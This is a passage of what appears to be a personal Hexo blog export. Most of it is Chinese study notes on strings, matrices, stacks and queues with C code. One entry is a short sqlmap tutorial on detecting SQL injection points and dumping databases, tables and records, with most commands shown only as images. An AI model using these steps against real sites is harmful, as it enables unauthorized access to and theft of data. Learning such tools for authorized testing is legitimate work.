<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">StrCompare</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=S.length &amp;&amp; i&lt;=T.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(S.ch[i]!=T.ch[i])</span><br><span class="line">            <span class="keyword">return</span> S.ch[i]-T.ch[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//扫描过的所有字符都相同，则长度长的串更大</span></span><br><span class="line">    <span class="keyword">return</span> S.length-T.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="定位操作"><a href="#定位操作" class="headerlink" title="定位操作"></a>定位操作</h4><p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604172716580.png" alt></p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604172735794.png" style="zoom:67%;"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>,n=S.length,m=T.length;</span><br><span class="line">    SString sub;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n-m+<span class="number">1</span>)&#123;</span><br><span class="line">        SubString(sub,S,i,m);</span><br><span class="line">        <span class="keyword">if</span>(StrCompare(sub,T)!=<span class="number">0</span>)</span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>串</tag>
      </tags>
  </entry>
  <entry>
    <title>串的基本操作</title>
    <url>/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>串的定义增删改查和字符集拓展内容的学习</p>
<span id="more"></span>
<h2 id="串的基本操作"><a href="#串的基本操作" class="headerlink" title="串的基本操作"></a>串的基本操作</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>即字符串（string）由零个或者多个字符组成的有限序列，一般记为：</p>
<script type="math/tex; mode=display">
S ='a_1a_2....a_n'</script><p>S：串名       n：串的长度   n=0时成为空串</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604162622856.png" alt></p>
<p>子串：串中任意个<strong>连续</strong>的字符组成的子序列</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604163002890.png" alt></p>
<p>主串：包含子串的串</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604162948821.png" alt></p>
<p>字符在主串中的位置：字符在串中的序号  （ps：空格也是一种字符）</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604162939273.png" alt></p>
<p>子串在主串中的位置：子串的第一个字符在主串中的位置</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604162903691.png" style="zoom:67%;"></p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604163018603.png" style="zoom:67%;"></p>
<p>串是一种特殊的线性表，数据元素之间呈现线性关系</p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604163702551.png" alt></p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604163803577.png" style="zoom:80%;"></p>
<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>y=f(x)</p>
<p>字符集：函数定义域</p>
<p>编码：函数映射规则f</p>
<p>y：对应的二进制数</p>
<p>英文字符——ASCII字符集  （2^8只有256种状态）</p>
<p>中英文——Unicode字符集</p>
<p>考研中默认每个字符占1B</p>
<h4 id="拓展——乱码问题"><a href="#拓展——乱码问题" class="headerlink" title="拓展——乱码问题"></a>拓展——乱码问题</h4><p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604164822168.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>串</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap使用</title>
    <url>/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>sqlmap的get使用方法和post使用方法以及其他技巧(更新ing~)</p>
<span id="more"></span>
<h2 id="get使用方法"><a href="#get使用方法" class="headerlink" title="get使用方法"></a>get使用方法</h2><p>(1)查看是否有注入点：sqlmap -u 网址<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143754072.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143808583.png" alt><br>证明有注入点<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143944207.png" alt><br>得到服务器操作系统为linux centOS，后端语言为php，数据库为mysql</p>
<p>(2)获取数据库<br>        ((1))获取全部数据库<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144244725.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144303120.png" alt><br>        ((2))获取当前数据库<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144412391.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144432759.png" alt="image-20220815144432759"></p>
<p>(3)获取当前数据库里所有表<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144547931.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144611455.png" alt="image-20220815144611455"></p>
<p>(4)获取表的字段<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815145336829.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815145356494.png" alt></p>
<p>(5)获取字段内容<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815145525659.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815145534950.png" alt><br>如果字段内容多的话可以再加上如 —start 1 —stop 100 ——获取1-100条数据<br>—dump 可以换成 —dump-all 导出全部内容</p>
<h2 id="post使用方法"><a href="#post使用方法" class="headerlink" title="post使用方法"></a>post使用方法</h2><p>通过burp抓包请求<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150536388.png" alt><br>用txt形式保存<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150558636.png" alt><br>检验注入点<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150625346.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150643242.png" alt="image-20220815150643242"><br>获取库名<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150734338.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150746967.png" alt><br>其余步骤与get一样</p>
<h2 id="指定位置的注入"><a href="#指定位置的注入" class="headerlink" title="指定位置的注入"></a>指定位置的注入</h2><p>在想注入的地方加<em><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151258357.png" alt><br>运行sqlmap后就会探测到</em>号<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151341838.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151409577.png" alt="image-20220815151409577"></p>
<h2 id="盲注使用不接收http-body"><a href="#盲注使用不接收http-body" class="headerlink" title="盲注使用不接收http body"></a>盲注使用不接收http body</h2><p><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151536755.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151554688.png" alt="image-20220815151554688"></p>
]]></content>
      <categories>
        <category>web攻防</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>吐槽</title>
    <url>/2022/08/14/%E5%90%90%E6%A7%BD/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="b9a65e82c35f366bb877f81b5bc7a6399eae6f51e8132b2078553c6096c19e5d">9925390bebf6984373a839862eef41f931af2bb8f7d76ea6c0e5707626d5a5a4e2a0222893318c22ae684cfe2fcea95cf77c2ed6887195b707fdb14130f34fbef2be8ba38e187bc49577c1ade86e4c565c1ab919414102441050ee554331b89b30bbf427bb7a643eaeb3f0ff1827663e7736076daef2b3ac44b551c567914ae27b353167c9c65013e8a80f73d8abe59d408ee9d4e624ccddc80090fe5d6d327ecbc895d3ac236741bc7b993f6d00aef716b9150966e817f5feb0953b2bef648131dff3a1af2a66f75839270e2e01bcad853db54343ab701516d85eb026e36b8c25aa90c492989b4af27ebede1a903f89b335eaa60e2c8b540644d0da13486ff3019e27e39511e769697fb252719bb8ec56c7facec860f3d068a08207ec8886ab52c38c39fe3ea2651846d8efff594f2866e5912d1a524b1a1dda92ffa94f96e6e3dba58c6c6d913118fc6199d645af1636f29f0dfd7de8b881d2e272c391579b5b97d2d65741b5589ddc4c39bf65978d8e4cf19318699d954d12fbb4804dcf90115227a4c44fdc23e1587afbdad9b6ee8544f88c37360524c6749d8fa5f5b20ab17c7761ec10835adbbdbf4e2c7ef247ae47b85dc550cb78e9f863a0b7eefd1f2ae101d4a04c42c4deb45e23b1e978e6e749c634f434ad2f7d86bf9c2ffda82f010de13310ef2dbae4faa320bd517e0b7d9a249992829a2c7fbfac603ae1b67479e7f7b70367d191629661c9e2d5a6293105630fe9039244458ca5c3b4e672c4ddbfa2c2522f36c22c6c6c5d87caa1c1a2de3e011f0d57bbcac7a75e5a97d87ea99fc63c89de9474c1719c31042e3f84</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">这可是我的挚爱亲朋，手足兄弟，得要密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>爱好</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵</title>
    <url>/2022/08/14/%E7%9F%A9%E9%98%B5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>矩阵的存储代码实现</p>
<span id="more"></span>
<h2 id="特殊矩阵"><a href="#特殊矩阵" class="headerlink" title="特殊矩阵"></a>特殊矩阵</h2><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><p>ElemType a[10];    //ElemType型一维数组</p>
<p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603194725210.png" alt></p>
<h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><p>ElemType b[2] [4]    //2行4列的二维数组</p>
<p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603194843476.png" alt></p>
<p>起始地址：LOC</p>
<p>行优先存储地址计算<img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603194958977.png" alt></p>
<p>列优先存储地址计算<img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603195101464.png" alt></p>
<p>二维数组也具有随机存储的性质</p>
<h3 id="普通矩阵的存储"><a href="#普通矩阵的存储" class="headerlink" title="普通矩阵的存储"></a>普通矩阵的存储</h3><h4 id="对称矩阵"><a href="#对称矩阵" class="headerlink" title="对称矩阵"></a>对称矩阵</h4><p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603195510230.png" alt></p>
<p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603195836998.png" style="zoom:67%;"></p>
<h3 id="三角矩阵"><a href="#三角矩阵" class="headerlink" title="三角矩阵"></a>三角矩阵</h3><p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603200202029.png" alt></p>
<h3 id="三对角矩阵（带状矩阵）"><a href="#三对角矩阵（带状矩阵）" class="headerlink" title="三对角矩阵（带状矩阵）"></a>三对角矩阵（带状矩阵）</h3><p>  <img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603200953049.png" alt></p>
<p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603201426822.png" style="zoom:80%;"></p>
<h3 id="稀疏矩阵"><a href="#稀疏矩阵" class="headerlink" title="稀疏矩阵"></a>稀疏矩阵</h3><p>非零元素的个数远远少于矩阵元素的个数</p>
<p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603201607063.png" style="zoom:50%;"></p>
<p> <img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603201638617.png" style="zoom: 80%;"><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603201828331-16604628178811.png" style="zoom: 67%;"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>栈和队列</tag>
      </tags>
  </entry>
  <entry>
    <title>栈和队列的应用</title>
    <url>/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>栈和队列的应用，如括号匹配，表达式值中的应用，递归，树、图的遍历等</p>
<span id="more"></span>
<h2 id="栈在括号匹配中的应用"><a href="#栈在括号匹配中的应用" class="headerlink" title="栈在括号匹配中的应用"></a>栈在括号匹配中的应用</h2><p>IDE:可视化的编程环境</p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603180407947-16604625560341.png" style="zoom:67%;"><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603180507316.png" style="zoom:67%;"></p>
<p>扫描到左括号就入栈，扫描到右括号就出栈进行匹配 </p>
<p>代码实现</p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603182409614.png" alt></p>
<h2 id="栈在表达式求值中的应用"><a href="#栈在表达式求值中的应用" class="headerlink" title="栈在表达式求值中的应用"></a>栈在表达式求值中的应用</h2><p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603183310686.png" alt></p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603184904342.png" alt></p>
<p>先出栈的是右操作数，后出栈的是左操作数 </p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603191739417.png" alt></p>
<h2 id="栈的应用——递归"><a href="#栈的应用——递归" class="headerlink" title="栈的应用——递归"></a>栈的应用——递归</h2><p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603192451544.png" alt></p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603192500473.png" alt></p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603192716850.png" alt></p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603193038318.png" alt></p>
<p>递归调用时，函数调用栈可称为递归工作栈</p>
<p>递归算法的缺点：太多层递归可能导致栈溢出。可能包含多次重复计算</p>
<h2 id="队列的应用"><a href="#队列的应用" class="headerlink" title="队列的应用"></a>队列的应用</h2><h3 id="树的层次遍历"><a href="#树的层次遍历" class="headerlink" title="树的层次遍历"></a>树的层次遍历</h3><p>具体查看树的章节</p>
<h3 id="图的广度优先遍历"><a href="#图的广度优先遍历" class="headerlink" title="图的广度优先遍历"></a>图的广度优先遍历</h3><p>具体查看图的章节</p>
<h3 id="在操作系统中的应用"><a href="#在操作系统中的应用" class="headerlink" title="在操作系统中的应用"></a>在操作系统中的应用</h3><p>FCFS(First Come First Service)先来先服务的策略</p>
<p>eg1：</p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603194341970.png" alt></p>
<p>轮流获得cpu的服务</p>
<p>eg2：</p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603194439959.png" alt></p>
<p>可缓解主机域打印机速度不匹配的问题</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>栈与队列</tag>
      </tags>
  </entry>
  <entry>
    <title>队列</title>
    <url>/2022/08/13/%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>队列的定义，以及队列的顺序存储结构和链式存储结构的代码实现以及部分操作,双端队列的定义</p>
<span id="more"></span>
<h2 id="队列（Queue）"><a href="#队列（Queue）" class="headerlink" title="队列（Queue）"></a>队列（Queue）</h2><h3 id="队列的定义"><a href="#队列的定义" class="headerlink" title="队列的定义"></a>队列的定义</h3><p>只允许在一端插入，在另一端删除的线性表</p>
<p>入队：插入     eg：打饭，高速过闸口</p>
<p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603163038483.png" alt></p>
<p>插入的一段为队尾，删除的一端为队头</p>
<p>队列的特点：先进先出（First In First Out)(FIFO)</p>
<p>栈的特点：后进先出（LIFO）</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603163231846.png" alt></p>
<h2 id="队列的顺序存储结构"><a href="#队列的顺序存储结构" class="headerlink" title="队列的顺序存储结构"></a>队列的顺序存储结构</h2><h3 id="队列的顺序实现-初始化和判空操作"><a href="#队列的顺序实现-初始化和判空操作" class="headerlink" title="队列的顺序实现,初始化和判空操作"></a>队列的顺序实现,初始化和判空操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elemtype data[MaxSize];     <span class="comment">//静态数组存放队列元素</span></span><br><span class="line">    <span class="type">int</span> front,rear;             <span class="comment">//队头队尾指针</span></span><br><span class="line">&#125; SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(SqQueue &amp;Q)</span>&#123;</span><br><span class="line">    Q.front = Q.rear =<span class="number">0</span>;    <span class="comment">//初始时 队头队尾指针指向0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空操作</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">QueueEmpty</span><span class="params">(SqQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear == Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testQueue</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//声明一个队列（顺序存储）</span></span><br><span class="line">    SqQueue Q;</span><br><span class="line">    <span class="comment">//。。。后续操作。。。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="入队操作"><a href="#入队操作" class="headerlink" title="入队操作"></a>入队操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">EnQueue</span><span class="params">(SqQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MaxSize==Q.front )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//队满报错</span></span><br><span class="line">    Q.data[Q.rear] = x;               <span class="comment">//新元素插入队尾</span></span><br><span class="line">    Q.rear = (Q.rear + <span class="number">1</span>)%MaxSize;    <span class="comment">//队尾指针加1取模</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出队操作和查询队头操作"><a href="#出队操作和查询队头操作" class="headerlink" title="出队操作和查询队头操作"></a>出队操作和查询队头操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(SqQueue &amp;Q,Elemtype &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear == Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x = Q.data[Q.front];</span><br><span class="line">    Q.front =(Q.front+<span class="number">1</span>)%MaxSize;   <span class="comment">//删除这一句后就是查询队头操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断队列已满-已空-元素个数"><a href="#判断队列已满-已空-元素个数" class="headerlink" title="判断队列已满/已空/元素个数"></a>判断队列已满/已空/元素个数</h3><p>元素个数：（rear+MaxSize-front)%MaxSize</p>
<p>方案一：</p>
<p>已满：(Q.rear+1)%MaxSize==Q.front</p>
<p>已空：Q.rear == Q.front</p>
<p>方案二：</p>
<p>增加一个变量 int size  插入成功 size++ 删除成功size — 初始化  size=0</p>
<p>队满条件：size==MaxSize    队空条件：size ==0</p>
<p>方案三：</p>
<p>增加一个变量tag（最近进行的是删除赋值为0，插入赋值为1，初始化tag=0）</p>
<p>原理：只有删除操作才可能导致队空，只有插入操作才可能导致队满</p>
<p>队满条件：front==rear&amp;&amp;tag=1 </p>
<p>队空条件：front==rear&amp;&amp;tag=0</p>
<h3 id="其他出题方法"><a href="#其他出题方法" class="headerlink" title="其他出题方法"></a>其他出题方法</h3><p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603170120078.png" alt></p>
<p>初始化的时候设置rear=MaxSize-1 front=0</p>
<p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603170229143.png" style="zoom: 67%;"><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603170342160-16604622170741.png" style="zoom: 67%;"></p>
<p>判空：方案一：牺牲一个存储单元</p>
<pre><code>       方案二：设置变量tag或size
</code></pre><h2 id="队列的链式存储结构"><a href="#队列的链式存储结构" class="headerlink" title="队列的链式存储结构"></a>队列的链式存储结构</h2><h3 id="链式实现及初始化"><a href="#链式实现及初始化" class="headerlink" title="链式实现及初始化"></a>链式实现及初始化</h3><h4 id="带头结点"><a href="#带头结点" class="headerlink" title="带头结点"></a>带头结点</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;  </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    LinkNode *front,*rear;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">    <span class="comment">//初始时front，rear都指向头结点</span></span><br><span class="line">    Q.front=Q.rear=(LinkNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testLinkQueue</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    InitQueue(Q);</span><br><span class="line">    <span class="comment">//后续操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603171845086.png" style="zoom: 67%;"></p>
<h4 id="不带头结点"><a href="#不带头结点" class="headerlink" title="不带头结点"></a>不带头结点</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">    Q.front=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603172140271.png" style="zoom:80%;"></p>
<h3 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//新元素入队（带头结点）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">    LinkNode *s=(LinkNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    s-&gt;data=x;</span><br><span class="line">    s-&gt;next=null;</span><br><span class="line">    Q.rear-&gt;next=s;     <span class="comment">//新结点插入到rear之后</span></span><br><span class="line">    Q.rear=s;           <span class="comment">//修改rear指针</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//新元素入队（不带头结点）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">    LinkNode *s=(LinkNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    s-&gt;data=x;</span><br><span class="line">    s-&gt;next=null;</span><br><span class="line">    <span class="keyword">if</span> (Q.front == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        Q.front = s;</span><br><span class="line">        Q。rear = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        